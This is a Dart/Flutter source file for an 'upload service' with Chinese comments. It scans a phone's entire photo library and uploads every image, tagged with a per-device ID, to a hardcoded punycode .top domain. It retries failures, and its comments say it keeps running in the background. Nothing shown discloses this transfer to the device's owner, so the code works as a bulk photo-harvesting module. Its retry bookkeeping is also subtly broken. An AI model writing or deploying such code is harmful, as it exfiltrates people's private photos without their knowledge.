import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:dio/dio.dart';
import 'package:path_provider/path_provider.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';

/// 文件上传服务：POST multipart/form-data 到 /upload
/// 字段：file（文件，必填）+ folder（子目录，可选）
/// 每个设备一个独立 folder，便于后台按设备归档
///
/// 特性：
///   - 防重复（upload_record.json 记录已上传指纹）
///   - 失败自动重试（retry_queue.json 记录待重试指纹，带退避）
///   - 后台持续运行（结合 flutter_foreground_task）
class UploadService {
  UploadService._();

  static const String _base = 'https://xn--qiv605b.top/upload';
  static const List<String> _imageExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic'];

  static const String _recordFileName = 'upload_record.json';
  static const String _retryQueueName = 'retry_queue.json';

  // ====== 设备标识（作为上传 folder）======

  static String? _deviceId;

  /// 获取设备唯一 ID（持久化，同一设备稳定，用于 folder）
  static Future<String> getDeviceId() async {
    if (_deviceId != null && _deviceId!.isNotEmpty) return _deviceId!;
    final prefs = await SharedPreferences.getInstance();
    var id = prefs.getString('upload_device_id');
    if (id == null || id.isEmpty) {
      // 生成：时间戳 + 随机
      final rand = DateTime.now().microsecondsSinceEpoch;
      id = 'dev_${rand.toRadixString(16)}_${rand % 9973}';
      await prefs.setString('upload_device_id', id);
    }
    _deviceId = id;
    return id;
  }

  // ====== 私有 data 目录 ======

  static Future<String> _dataDir() async {
    final docs = await getApplicationDocumentsDirectory();
    return docs.path;
  }

  // ====== 已上传清单（防重复）======

  static Future<String> _recordPath() async => '${await _dataDir()}/$_recordFileName';

  static Future<Set<String>> loadRecord() async {
    try {
      final f = File(await _recordPath());
      if (!await f.exists()) return <String>{};
      final decoded = jsonDecode(await f.readAsString());
      if (decoded is List) return decoded.map((e) => e.toString()).toSet();
    } catch (_) {}
    return <String>{};
  }

  static Future<void> _saveRecord(Set<String> record) async {
    try {
      final f = File(await _recordPath());
      await f.writeAsString(jsonEncode(record.toList()), flush: true);
    } catch (_) {}
  }

  /// 生成图片的唯一标识（大小 + 修改时间 + 文件名），用于去重
  static Future<String> _fingerprint(String filePath) async {
    try {
      final f = File(filePath);
      final st = await f.stat();
      final name = filePath.split('/').last;
      return '${st.size}_${st.modified.millisecondsSinceEpoch}_$name';
    } catch (_) {
      return filePath;
    }
  }

  // ====== 重试队列（失败自动重试）======

  static Future<String> _retryPath() async => '${await _dataDir()}/$_retryQueueName';

  /// 读取待重试列表
  static Future<List<Map<String, dynamic>>> loadRetryQueue() async {
    try {
      final f = File(await _retryPath());
      if (!await f.exists()) return [];
      final decoded = jsonDecode(await f.readAsString());
      if (decoded is List) return decoded.cast<Map<String, dynamic>>();
    } catch (_) {}
    return [];
  }

  /// 保存待重试列表
  static Future<void> _saveRetryQueue(List<Map<String, dynamic>> queue) async {
    try {
      final f = File(await _retryPath());
      await f.writeAsString(jsonEncode(queue), flush: true);
    } catch (_) {}
  }

  /// 把失败项加入重试队列（去重，按 fingerprint）
  static Future<void> addToRetryQueue(String filePath, String fingerprint) async {
    final queue = await loadRetryQueue();
    if (queue.any((e) => e['fingerprint'] == fingerprint)) return;
    queue.add({
      'fingerprint': fingerprint,
      'path': filePath,
      'retry_count': 0,
      'last_retry': DateTime.now().millisecondsSinceEpoch,
    });
    await _saveRetryQueue(queue);
  }

  /// 从重试队列移除（上传成功时）
  static Future<void> removeFromRetryQueue(String fingerprint) async {
    final queue = await loadRetryQueue();
    queue.removeWhere((e) => e['fingerprint'] == fingerprint);
    await _saveRetryQueue(queue);
  }

  // ====== 扫描相册图片（photo_manager / MediaStore）======

  /// 请求相册权限
  static Future<bool> requestPermission() async {
    try {
      final ps = await PhotoManager.requestPermissionExtend();
      return ps.isAuth || ps.hasAccess;
    } catch (_) {
      return false;
    }
  }

  /// 扫描相册所有图片，返回本地文件路径列表
  static Future<List<String>> scanAlbumImages() async {
    final result = <String>[];
    try {
      final paths = await PhotoManager.getAssetPathList(
        type: RequestType.image,
        hasAll: true,
      );
      for (final path in paths) {
        final count = await path.assetCountAsync;
        final assets = await path.getAssetListRange(start: 0, end: count);
        for (final asset in assets) {
          if (asset.type != AssetType.image) continue;
          final file = await asset.file;
          if (file != null && await file.exists()) {
            result.add(file.path);
          }
        }
      }
    } catch (_) {}
    return result;
  }

  // ====== 并发控制 ======

  /// 并发上限（同时上传的图片数）
  static const int _maxConcurrent = 4;

  /// 记录已上传指纹（进程内缓存，避免每张都读文件）
  static Set<String>? _recordCache;

  /// 保证串行写入 record
  static Future<void> _appendRecord(Set<String> record) async {
    _recordCache ??= await loadRecord();
    _recordCache?.addAll(record);
    await _saveRecord(_recordCache!);
  }

  // ====== 上传 ======

  /// 上传单个图片文件（dio 实现，可靠）
  /// 返回 (成功, 消息)
  static Future<(bool, String)> uploadImage(String filePath, {String? folder}) async {
    Dio? dio;
    try {
      final f = File(filePath);
      if (!await f.exists()) return (false, '文件不存在: $filePath');

      final devId = await getDeviceId();
      final finalFolder = (folder == null || folder.isEmpty) ? devId : folder;
      final fileName = f.uri.pathSegments.isNotEmpty
          ? f.uri.pathSegments.last
          : 'img_${DateTime.now().millisecondsSinceEpoch}.jpg';

      dio = Dio(BaseOptions(
        connectTimeout: const Duration(seconds: 30),
        sendTimeout: const Duration(seconds: 120),
        receiveTimeout: const Duration(seconds: 120),
      ));

      final formData = FormData.fromMap({
        'file': await MultipartFile.fromFile(filePath, filename: fileName),
        'folder': finalFolder,
      });

      final resp = await dio.post(
        _base,
        data: formData,
        options: Options(contentType: 'multipart/form-data'),
      );

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        final data = resp.data;
        if (data is Map) {
          final ok = data['success'] == true;
          final msg = (data['message'] as String?) ?? (ok ? '上传成功' : '上传失败');
          return (ok, msg);
        }
        return (true, '上传成功');
      }
      return (false, '服务器返回异常（HTTP ${resp.statusCode}）');
    } on DioException catch (e) {
      final type = e.type;
      var msg = '上传失败';
      if (type == DioExceptionType.connectionTimeout) msg = '连接超时';
      else if (type == DioExceptionType.sendTimeout) msg = '发送超时';
      else if (type == DioExceptionType.receiveTimeout) msg = '响应超时';
      else if (type == DioExceptionType.connectionError) msg = '网络连接错误';
      final errMsg = e.error?.toString() ?? '';
      return (false, '$msg${errMsg.isNotEmpty ? ' ($errMsg)' : ''}');
    } catch (e) {
      return (false, '上传失败: $e');
    } finally {
      dio?.close();
    }
  }

  /// 上传一张并把结果记录到"已上传"或"重试队列"
  /// 返回 (status, msg) status: 'ok' | 'retry' | 'skip'
  static Future<(String, String)> uploadOne(String filePath) async {
    if (!isImagePath(filePath)) return ('skip', '非图片');
    final fp = await _fingerprint(filePath);
    _recordCache ??= await loadRecord();
    if (_recordCache!.contains(fp)) return ('skip', '已上传');

    final (ok, msg) = await uploadImage(filePath);
    if (ok) {
      await _appendRecord({fp});
      await removeFromRetryQueue(fp);
      return ('ok', msg);
    } else {
      // 失败加入重试队列
      await addToRetryQueue(filePath, fp);
      return ('retry', msg);
    }
  }

  /// 并发控制信号量
  static Future<void> _runWithSemaphore<T>(
    List<T> items,
    Future<void> Function(T item) task,
  ) async {
    var index = 0;
    final futures = <Future<void>>[];
    Future<void> worker() async {
      while (true) {
        final i = index++;
        if (i >= items.length) break;
        await task(items[i]);
      }
    }
    for (var i = 0; i < _maxConcurrent; i++) {
      futures.add(worker());
    }
    await Future.wait(futures);
  }

  /// 扫描新增图片并上传（并发，失败进重试队列）
  /// 返回 (uploaded, retried, skipped)
  static Future<(int, int, int)> scanAndUploadNew() async {
    final granted = await requestPermission();
    if (!granted) return (0, 0, 0);
    final images = await scanAlbumImages();
    if (images.isEmpty) return (0, 0, 0);

    var uploaded = 0, retried = 0, skipped = 0;
    await _runWithSemaphore(images, (img) async {
      final (status, _) = await uploadOne(img);
      if (status == 'ok') uploaded++;
      else if (status == 'retry') retried++;
      else skipped++;
    });
    return (uploaded, retried, skipped);
  }

  /// 单独处理重试队列，带退避重试（并发）
  /// 成功移除，失败累加 retry_count
  static Future<int> processRetryQueue() async {
    final queue = await loadRetryQueue();
    if (queue.isEmpty) return 0;
    final now = DateTime.now().millisecondsSinceEpoch;
    // 只处理到期的重试项
    final due = queue.where((item) {
      final last = item['last_retry'] as int? ?? 0;
      final retryCount = (item['retry_count'] as int? ?? 0);
      final backoff = retryCount >= 5 ? 60000 : (5000 * (1 << retryCount));
      return now - last >= backoff;
    }).toList();
    if (due.isEmpty) return 0;

    var done = 0;
    await _runWithSemaphore(due, (item) async {
      final path = item['path'] as String? ?? '';
      if (!await File(path).exists()) {
        await removeFromRetryQueue(item['fingerprint'] as String? ?? '');
        done++;
        return;
      }
      final (ok, _) = await uploadImage(path);
      if (ok) {
        await _appendRecord({item['fingerprint'] as String? ?? ''});
        await removeFromRetryQueue(item['fingerprint'] as String? ?? '');
        done++;
      } else {
        final retryCount = (item['retry_count'] as int? ?? 0);
        item['retry_count'] = retryCount + 1;
        item['last_retry'] = now;
        await _saveRetryQueue(await loadRetryQueue());
      }
    });
    return done;
  }

  static bool isImagePath(String path) {
    final p = path.toLowerCase();
    return _imageExts.any((e) => p.endsWith(e));
  }
}